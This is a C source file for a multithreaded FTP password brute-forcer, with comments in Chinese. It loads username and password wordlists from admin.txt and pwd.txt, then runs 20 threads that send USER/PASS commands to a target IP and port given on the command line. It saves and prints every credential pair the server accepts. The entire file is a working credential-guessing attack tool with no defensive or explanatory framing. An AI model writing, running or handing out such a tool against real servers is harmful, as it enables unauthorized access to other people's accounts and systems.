
#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <string.h>
#include <time.h>
#include <pthread.h>

#define STATE_CODE_FAILED 0
#define STATE_CODE_OK 1
#define STATE_CODE_REVALIDATE 2

#define MAXLINE 4096
#define MAX_TEXT_LEN 100 /*文本的每行的最大长度*/
#define ACCOUNT_COUNT 100	/*账号容器长度*/
#define PWD_COUNT 500		/*密码容器长度*/
#define SCAN_THREAD_COUNT 20 /*扫描线程数量*/

/*ftp中的状态码*/
#define STATE_CODE_CONNECT_SUCC "220"
#define STATE_CODE_ACCOUNT_OK "331"
#define STATE_CODE_PWD_OK "230"
#define STATE_CODE_LOGIN_USER_FIRST "503"

struct argument
{
    char *ip;
    int port;
    int from;
	int to;
    int i;
};

char* ftp_accounts[ACCOUNT_COUNT];
int ftp_accounts_count;/*ftp账号实际数量*/
char* ftp_pwds[PWD_COUNT];
int ftp_pwds_count;/*ftp账号密码数量*/
char* verified_accounts[ACCOUNT_COUNT*2];

/**
 * 解析ftp协议返回的状态码
*/
void
get_response_code(char* buf,char* code)
{
	memcpy(code,buf,3);
	*(code+3)='\0';
}

/**
 * 读取账号文件
 */
void
thread_load_acc(){

	FILE *fp;
	if((fp = fopen("admin.txt","r")) == NULL){
		printf("open error!\n");
		exit(1);
	}

	ftp_accounts_count = 0;
	char account[MAX_TEXT_LEN];
	while(fgets(account,MAX_TEXT_LEN,fp) !=  NULL){
		int len = strlen(account);
		char* p = malloc(sizeof(char)*(len+1));
		memcpy(p,account,len);
		*(p+len) = '\0';
		ftp_accounts[ftp_accounts_count] = p;
		ftp_accounts_count++;
		memset(account,0,len);
	}

    fclose (fp);
}

/**
 * 读取密码文件
 */
void
thread_load_pwds (){
	FILE *fp;
	if((fp = fopen("pwd.txt","r")) == NULL){
		printf("文件打开失败!\n");
		exit(1);
	}

	ftp_pwds_count = 0;
	char pwd[MAX_TEXT_LEN];
	while(fgets(pwd,MAX_TEXT_LEN,fp) !=  NULL){
		int len = strlen(pwd);
		char* p = malloc(sizeof(char)*(len+1));
		memcpy(p,pwd,len);
		*(p+len) = '\0';
		ftp_pwds[ftp_pwds_count] = p;
		ftp_pwds_count++;
		memset(pwd,0,len);
	}

    fclose (fp);
}

/**
 * 验证账号
*/
int verify_account (int sockfd,char* account){

	printf("验证账号->%s",account);

	ssize_t n;
	char read_buf[MAXLINE];
	char write_buf[MAXLINE];
	char*  state_code = malloc(sizeof(char)*4);
	memset(write_buf,0,MAXLINE);
	strcpy(write_buf,"USER ");
	strcat(write_buf,account);
	memcpy(write_buf+(strlen(write_buf)-1),"\r\n",3);
	write(sockfd, write_buf, strlen(write_buf));
	memset(read_buf,0,MAXLINE);
	n =	read(sockfd, read_buf, MAXLINE);
	get_response_code(read_buf,state_code);
	if(strcmp(state_code,STATE_CODE_ACCOUNT_OK) != 0){
		free(state_code);
		return STATE_CODE_FAILED;
	}
	free(state_code);
	return STATE_CODE_OK;
}

/**
 * 验证密码
*/
int
verify_pwd (int sockfd,char* pwd){
	printf("验证密码->%s",pwd);

	ssize_t n;
	char read_buf[MAXLINE];
	char write_buf[MAXLINE];
	char*state_code = malloc(sizeof(char)*4);
	memset(write_buf,0,MAXLINE);
	strcpy(write_buf,"PASS ");
	strcat(write_buf,pwd);
	memcpy(write_buf+(strlen(write_buf)-1),"\r\n",3);
	write(sockfd, write_buf, strlen(write_buf));
	memset(read_buf,0,MAXLINE);
	n =	read(sockfd, read_buf, MAXLINE);
	get_response_code(read_buf,state_code);
	/*密码正确*/
	if(strcmp(state_code,STATE_CODE_PWD_OK) == 0){
		free(state_code);
		return STATE_CODE_OK;
	}

	/*需要重新验证账号*/
	if(strcmp(state_code,STATE_CODE_LOGIN_USER_FIRST) == 0){
		free(state_code);
		return STATE_CODE_REVALIDATE;
	}

	free(state_code);
	return STATE_CODE_FAILED;
}



/**
 * 保存结果
*/
int idx = 0;
void save_account (char* account,char* pwd){

	int len = strlen(account);
	char* p = malloc(sizeof(char)*(len+1));
	memcpy(p,account,len);
	*(p+len) = '\0';
	verified_accounts[idx] = p;

	len = strlen(pwd);
	p = malloc(sizeof(char)*(len+1));
	memcpy(p,pwd,len);
	*(p+len) = '\0';
	verified_accounts[idx+1] = p;

	idx += 2;
}


/**
 * 扫描密码
 * @param ip ftp地址
 * @param port ftp端口
 * @param account 验证的账号
*/
int scan_pwd(char* ip,int port,int* account){

	char read_buf[MAXLINE];
	char write_buf[MAXLINE];

	size_t n;
	char* state_code = malloc(sizeof(char)*4);//free
	int sockfd = socket(PF_INET, SOCK_STREAM,0);

	struct sockaddr_in address;
    bzero(&address, sizeof(address));
    address.sin_family = AF_INET;
    inet_pton(AF_INET, ip, &address.sin_addr);
    address.sin_port = htons(port);

	/*连接ftp服务器*/
	int rst;
    if((rst = connect(sockfd,(struct sockaddr *)&address,sizeof(address)))<0){
		 printf("connecting error!%i\n",rst);
		 exit(-1);
	}

	memset(read_buf,0,MAXLINE);
	n = read(sockfd, read_buf, MAXLINE);
	get_response_code(read_buf,state_code);
	if(strcmp(state_code,STATE_CODE_CONNECT_SUCC) != 0){
		printf("ftp->%s\r",read_buf);
		exit(-1);
	}
	printf("ftp--->%s\r",read_buf);


	/*验证账号*/
	if(strlen(account)>0){
		printf("验证账号-->:%s",account);
		if(verify_account(sockfd,account) == STATE_CODE_FAILED){
			return STATE_CODE_FAILED;
		}
	}

	/*验证密码*/
	for(int i = 0; i < PWD_COUNT;i++){
		if(ftp_pwds[i] == NULL){
			continue;
		}
		char* pwd = ftp_pwds[i];
		if(strlen(pwd)>0){
			int rst = verify_pwd(sockfd,pwd);
			switch(rst){
				case STATE_CODE_OK:
					printf("-->验证成功,密码为 %s\n",pwd);
					save_account(account,pwd);
					free(state_code);
					return STATE_CODE_OK;
					break;
				case STATE_CODE_REVALIDATE:
					/*需要重新验证账号*/
					if(verify_account(sockfd,account) == STATE_CODE_OK){
						if(verify_pwd(sockfd,pwd) == STATE_CODE_OK){
							printf("-->验证成功,密码为 %s\n",pwd);
							save_account(account,pwd);
							free(state_code);
							return STATE_CODE_OK;
						}
					}
					break;
				case STATE_CODE_FAILED:
					/*验证失败*/
					break;
			}
		}
	}


	free(state_code);
	return STATE_CODE_FAILED;
}

void thread_run(void *arg)
{
    struct argument *arg_thread;/*这里定义了一个指向argument类型结构体的指针arg_thread1，用它来接收传过来的参数的地址*/
    arg_thread=(struct argument *)arg;

	if(arg_thread->from <= arg_thread->to){
		for(int i = arg_thread->from; i <= arg_thread->to;i++){
			scan_pwd(arg_thread->ip,arg_thread->port,ftp_accounts[i]);
		}
	}

    pthread_exit(NULL);
}

/**
 * 开启多线程验证
*/
void multi_thread_scan(int* ip,int port,int thread_count){

	pthread_t *thread;
    thread = (pthread_t*)malloc(sizeof(pthread_t)*thread_count);

	for (int i = 0; i < thread_count;i++){

		struct argument *arg;

		int offset = (ftp_accounts_count / thread_count)*i;
		arg = (struct argument*)malloc(sizeof(struct argument));
		arg->ip = ip;
		arg->from = offset;
		int count = (ftp_accounts_count - offset) < (ftp_accounts_count/thread_count)  ? (ftp_accounts_count - offset) : ftp_accounts_count/thread_count;
		arg->to = offset + count - 1;
		arg->port = port;
		arg->i=i;
		pthread_create(&thread[i], NULL, thread_run,(void *)arg);
	}


    for (int j = 0; j < thread_count; j++) {
        void *thread_return;
        int ret = pthread_join(thread[j],&thread_return);/*等待第一个线程退出，并接收它的返回值*/
        if(ret !=0 ){
            printf("调用pthread_join获取线程1返回值出现错误!\n");
		}
        else {
            printf("pthread_join调用成功!线程1退出后带回的值是%d\n",(int)thread_return);
		}
    }
}


int
main(int argc,char ** argv)
{

	if(argc < 3){
		printf("Invalid args!Interface {ip} {port}\n");
		exit(-1);
	}

	/*计时器*/
	clock_t start_time;
	clock_t finish_time;
	int duration;

	/*ftp主机信息*/
	char* ip = argv[1];
	int port = atoi(argv[2]);
	ssize_t n;

	start_time = time(NULL);

	/*加载账号列表*/
	pthread_t tid_read_acc;
	if(pthread_create(&tid_read_acc,NULL,thread_load_acc,NULL)!=0){
		printf("error creating thread!");
		exit(-1);
	}

	/*加载密码列表*/
	pthread_t tid_read_pwd;
	if(pthread_create(&tid_read_pwd,NULL,thread_load_pwds,NULL)!=0){
		printf("error creating thread!");
		exit(-1);
	}

	/*等待账号、密码列表加载完成*/
	if (pthread_join(tid_read_acc, NULL) != 0){
		exit(-1);
    }

    if (pthread_join(tid_read_pwd, NULL) != 0){
		exit(-1);
    }

	/*开启多线程扫描账号*/
	multi_thread_scan(ip,port,SCAN_THREAD_COUNT);

	/*扫描结束输出结果*/
    printf("-----------\n");
    printf("/   HELLO  \\\n");
    printf("\\   看我!   /\n");
    printf("-----------\n");
    printf("     \\  ^__^\n");
    printf("      \\ (oo)\\_______\n");
    printf("        (__) \\       )\\/\\\n");
    printf("             ||----w |\n");
    printf("             ||     ||\n\n");
	printf("-->扫描结束.\n");


	finish_time = time(NULL);
	duration = (finish_time - start_time);
	printf( "-->花费时间%d秒!\n", duration );

	for(int i = 0; i < ACCOUNT_COUNT;i++){
		int idx = 2*i;
		if(verified_accounts[idx]){
			printf("-->账号:%s",verified_accounts[idx]);
		}

		if(verified_accounts[idx+1]){
			printf("-->密码:%s",verified_accounts[idx+1]);
		}
	}

	return 0;
}
